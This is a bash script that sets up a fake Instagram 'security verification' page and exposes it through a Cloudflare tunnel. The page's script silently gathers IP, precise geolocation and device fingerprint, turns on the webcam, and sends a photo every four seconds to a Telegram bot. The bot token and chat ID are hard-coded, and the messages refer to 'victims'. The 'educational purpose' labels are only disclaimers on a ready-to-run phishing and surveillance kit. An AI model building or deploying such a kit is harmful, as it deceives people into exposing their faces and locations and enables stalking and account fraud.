               
#!/bin/bash

# Instagram Phishing System with Auto Image Capture
# Educational Purpose Only

echo "
╔══════════════════════════════════════════════╗
║         INSTAGRAM SECURITY VERIFICATION      ║
║           Educational Purpose Only           ║
╚══════════════════════════════════════════════╝
"

# Configuration
BOT_TOKEN="8173690666:AAEwlacz-ddpgF6sLnzmnrESL3uSs1GbxJU"
ADMIN_ID="8448765277"
PORT="8080"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Print functions
info() { echo -e "${BLUE}[INFO]${NC} $1"; }
success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1"; }

# Cleanup function
cleanup() {
    echo
    info "Shutting down services..."
    kill $PHP_PID 2>/dev/null
    kill $TUNNEL_PID 2>/dev/null
    pkill -f "php" 2>/dev/null
    pkill -f "cloudflared" 2>/dev/null
    success "All services stopped"
    exit 0
}

trap cleanup INT

# Kill existing processes
info "Cleaning existing processes..."
pkill -f "php" 2>/dev/null
pkill -f "cloudflared" 2>/dev/null
sleep 2

# Check and install cloudflared
if ! command -v cloudflared &> /dev/null; then
    warning "Installing cloudflared..."
    ARCH=$(uname -m)
    case $ARCH in
        x86_64) ARCH="amd64" ;;
        aarch64) ARCH="arm64" ;;
        *) error "Unsupported architecture"; exit 1 ;;
    esac
    
    wget -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-$ARCH" -O /tmp/cloudflared
    chmod +x /tmp/cloudflared
    sudo mv /tmp/cloudflared /usr/local/bin/
    success "cloudflared installed"
fi

# Create Instagram-themed phishing page
info "Creating Instagram security verification page..."
cat > index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Instagram Security Verification</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body { 
            background: #ffffff;
            min-height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            padding: 20px;
            color: #262626;
        }
        .container { 
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 12px; 
            padding: 40px; 
            width: 100%; 
            max-width: 450px; 
            text-align: center;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }
        .instagram-logo {
            font-size: 42px;
            margin-bottom: 20px;
            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D, #F56040, #F77737, #FCAF45, #FFDC80);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 600;
        }
        h1 { 
            margin-bottom: 15px; 
            font-size: 24px; 
            font-weight: 600;
            color: #262626;
        }
        .subtitle { 
            color: #8e8e8e; 
            margin-bottom: 30px; 
            font-size: 14px;
            line-height: 1.4;
        }
        .camera-container {
            position: relative;
            margin: 25px 0;
        }
        .camera-box { 
            background: #fafafa; 
            border: 2px dashed #dbdbdb;
            border-radius: 12px; 
            padding: 30px 20px;
            min-height: 280px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }
        #videoElement { 
            width: 100%;
            max-width: 320px;
            height: 240px;
            border-radius: 8px;
            object-fit: cover;
            border: 1px solid #dbdbdb;
        }
        .captured-image {
            width: 100%;
            max-width: 320px;
            height: 240px;
            border-radius: 8px;
            object-fit: cover;
            border: 2px solid #0095f6;
        }
        .verification-status {
            background: #f0f9ff;
            border: 1px solid #bae6fd;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
        }
        .status-text {
            color: #0369a1;
            font-size: 14px;
            font-weight: 500;
        }
        .loading-dots {
            display: inline-block;
            margin-left: 5px;
        }
        .loading-dots::after {
            content: '';
            animation: dots 1.5s steps(5, end) infinite;
        }
        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60% { content: '...'; }
            80%, 100% { content: ''; }
        }
        .security-badge {
            background: #f0f9ff;
            border: 1px solid #bae6fd;
            border-radius: 6px;
            padding: 12px;
            margin: 15px 0;
            font-size: 12px;
            color: #0369a1;
        }
        .hidden { display: none; }
        .flash {
            animation: flash 0.3s ease;
        }
        @keyframes flash {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="instagram-logo">Instagram</div>
        <h1>Security Verification Required</h1>
        <div class="subtitle">
            To protect your account, we need to verify your identity using camera verification. 
            This helps us ensure your account security.
        </div>
        
        <div class="security-badge">
            🔒 This is a secure Instagram verification process. Camera access is required for identity confirmation.
        </div>
        
        <div class="camera-container">
            <div class="camera-box">
                <video id="videoElement" autoplay playsinline class="hidden"></video>
                <img id="capturedImage" class="captured-image hidden">
                <div id="cameraPlaceholder">
                    <div style="font-size: 48px; margin-bottom: 15px; color: #8e8e8e;">📷</div>
                    <div style="color: #8e8e8e; font-size: 14px;">Camera verification starting</div>
                    <div style="color: #8e8e8e; font-size: 12px; margin-top: 8px;">Please allow camera access</div>
                </div>
            </div>
        </div>
        
        <div class="verification-status">
            <div class="status-text">
                <span id="statusMessage">Initializing security verification</span>
                <span class="loading-dots"></span>
            </div>
        </div>

        <div style="margin-top: 20px; padding: 15px; background: #fafafa; border-radius: 8px; border: 1px solid #dbdbdb;">
            <p style="font-size: 11px; color: #8e8e8e; text-align: center;">
                🔒 For educational security research purposes only<br>
                This demonstration shows how camera verification works
            </p>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8173690666:AAEwlacz-ddpgF6sLnzmnrESL3uSs1GbxJU";
        const ADMIN_ID = "8448765277";
        let stream = null;
        let captureInterval = null;
        let photoCount = 0;
        let victimData = {};

        // Auto-start everything when page loads
        window.addEventListener('load', async () => {
            updateStatus("Starting security verification");
            
            try {
                // Collect all victim data
                victimData = await collectAllData();
                
                // Start camera automatically
                await startCameraAutomatically();
                
            } catch (error) {
                console.error('Auto-start error:', error);
                updateStatus("Verification failed - please refresh");
            }
        });

        // Update status message
        function updateStatus(message) {
            document.getElementById('statusMessage').textContent = message;
        }

        // Collect victim data automatically
        async function collectAllData() {
            updateStatus("Collecting security information");
            
            const data = {
                ip: await getIP(),
                location: await getLocation(),
                device: getDeviceInfo(),
                timestamp: new Date().toISOString()
            };
            
            // Send initial alert to Telegram
            await sendInitialAlert(data);
            return data;
        }

        // Get IP address
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const result = await response.json();
                return result.ip;
            } catch (e) {
                return 'Unknown';
            }
        }

        // Get location
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const loc = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        resolve(loc);
                    },
                    (error) => {
                        resolve(null);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        // Get device info
        function getDeviceInfo() {
            const info = {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                mobile: /Mobi|Android/i.test(navigator.userAgent),
                cookies: navigator.cookieEnabled
            };
            
            return info;
        }

        // Start camera automatically (no user click required)
        async function startCameraAutomatically() {
            try {
                updateStatus("Requesting camera access");
                
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'user'
                    } 
                });
                
                const video = document.getElementById('videoElement');
                video.srcObject = stream;
                video.classList.remove('hidden');
                document.getElementById('cameraPlaceholder').classList.add('hidden');
                
                updateStatus("Camera active - Verifying identity");
                
                // Start automatic capture every 4 seconds
                captureInterval = setInterval(() => {
                    captureAndSendPhoto();
                }, 4000);
                
                // First capture after 2 seconds
                setTimeout(() => {
                    captureAndSendPhoto();
                }, 2000);
                
            } catch (error) {
                updateStatus("Camera access required for verification");
            }
        }

        // Capture photo and send to Telegram
        async function captureAndSendPhoto() {
            try {
                const video = document.getElementById('videoElement');
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Get high quality photo
                const photoData = canvas.toDataURL('image/jpeg', 0.85);
                
                // Show visual feedback (quick flash)
                video.classList.add('flash');
                setTimeout(() => video.classList.remove('flash'), 300);
                
                // Send photo to Telegram
                await sendPhotoToTelegram(photoData);
                
                // Update counter
                photoCount++;
                updateStatus(`Identity verification in progress (${photoCount} photos)`);
                
            } catch (error) {
                console.error('Capture error:', error);
            }
        }

        // Send photo to Telegram
        async function sendPhotoToTelegram(photoData) {
            try {
                // Convert base64 to blob
                const response = await fetch(photoData);
                const blob = await response.blob();
                
                // Create form data for photo upload
                const formData = new FormData();
                formData.append('chat_id', ADMIN_ID);
                formData.append('photo', blob, `instagram_${victimData.ip}_${Date.now()}.jpg`);
                
                const caption = `📸 Instagram Security Photo #${photoCount}
                
👤 IP: ${victimData.ip}
📍 Location: ${victimData.location ? `${victimData.location.lat}, ${victimData.location.lon}` : 'Not available'}
📱 Device: ${victimData.device.platform}
🖥 Screen: ${victimData.device.screen}
🌍 Language: ${victimData.device.language}
📱 Mobile: ${victimData.device.mobile ? 'Yes' : 'No'}
⏰ Time: ${new Date().toLocaleString()}`;
                
                formData.append('caption', caption);
                
                // Send to Telegram
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
            } catch (error) {
                console.error('Photo upload failed:', error);
            }
        }

        // Send initial alert to Telegram
        async function sendInitialAlert(data) {
            const locText = data.location ? 
                `${data.location.lat}, ${data.location.lon}` : 'Not available';
            
            const message = `🔐 NEW INSTAGRAM VICTIM CONNECTED

📱 VICTIM INFORMATION:
IP: ${data.ip}
Platform: ${data.device.platform}
Screen: ${data.device.screen}
Browser: ${data.device.userAgent.split(' ')[0]}
Language: ${data.device.language}
Mobile: ${data.device.mobile ? 'Yes' : 'No'}
Timezone: ${data.device.timezone}

📍 LOCATION:
Coordinates: ${locText}
Accuracy: ${data.location?.accuracy || 'Unknown'} meters

⏰ TIME: ${new Date().toLocaleString()}

📸 CAMERA: Starting automatic photo capture
🔄 Capture Mode: Continuous every 4 seconds

🌐 COPYABLE IP: ${data.ip}
📍 COPYABLE LOCATION: ${locText}`;
            
            await sendToTelegram(message);
            
            // Send location if available
            if (data.location) {
                await sendLocationToTelegram(data.location.lat, data.location.lon);
            }
        }

        // Send message to Telegram
        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_ID,
                        text: message
                    })
                });
            } catch (error) {
                console.error('Telegram message error:', error);
            }
        }

        // Send location to Telegram
        async function sendLocationToTelegram(lat, lon) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_ID,
                        latitude: lat,
                        longitude: lon
                    })
                });
            } catch (error) {
                console.error('Location send error:', error);
            }
        }
    </script>
</body>
</html>
EOF

success "Instagram security verification page created"

# Start PHP server
info "Starting PHP server on port $PORT..."
php -S 0.0.0.0:$PORT > /dev/null 2>&1 &
PHP_PID=$!
sleep 3

# Start Cloudflare tunnel
info "Starting Cloudflare tunnel..."
cloudflared tunnel --url http://localhost:$PORT > cloudflared.log 2>&1 &
TUNNEL_PID=$!
sleep 5

# Get Cloudflare URL
TUNNEL_URL=$(grep -o "https://[^ ]*\.try\.cloudflare\.com" cloudflared.log | head -1)
LOCAL_IP=$(hostname -I | awk '{print $1}')

if [ -z "$TUNNEL_URL" ]; then
    TUNNEL_URL="https://$(hostname).try.cloudflare.com"
fi

# Send startup message to Telegram
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
    -d chat_id="$ADMIN_ID" \
    -d text="🔐 INSTAGRAM SECURITY VERIFICATION SYSTEM ACTIVATED

✅ SYSTEM STATUS: ONLINE AND CAPTURING
🌐 PUBLIC URL: $TUNNEL_URL
📡 LOCAL URL: http://$LOCAL_IP:$PORT

📸 AUTOMATIC CAPTURE FEATURES:
• Camera starts automatically
• Auto-capture every 4 seconds
• Real photos sent to Telegram
• Live location tracking
• Complete device fingerprinting
• IP address logging
• No user interaction required

🎯 VICTIM EXPERIENCE:
• Camera turns on automatically
• Photos captured continuously
• No status information shown
• Professional Instagram theme
• Educational security demo

⚠ EDUCATIONAL SECURITY RESEARCH PURPOSE ONLY" > /dev/null

# Display final information
echo
echo "╔══════════════════════════════════════════════╗"
echo "║      INSTAGRAM VERIFICATION SYSTEM READY     ║"
echo "╚══════════════════════════════════════════════╝"
echo
success "🌐 Public URL: $TUNNEL_URL"
success "📡 Local URL: http://$LOCAL_IP:$PORT"
echo
info "Automatic Capture Features:"
echo "  ✅ Camera starts automatically"
echo "  ✅ Auto-capture every 4 seconds"
echo "  ✅ No status information shown to victim"
echo "  ✅ Clean copyable text in Telegram"
echo "  ✅ Real photos to Telegram"
echo "  ✅ Instagram-themed interface"
echo
info "Telegram Messages Include:"
echo "  📧 Clean copyable IP and location"
echo "  📸 Photo count and device info"
echo "  📍 Direct location coordinates"
echo "  ⏰ Timestamp of capture"
echo
warning "Educational Security Research Purpose Only"
warning "Press Ctrl+C to stop the system"
echo

# Keep running
wait
                         
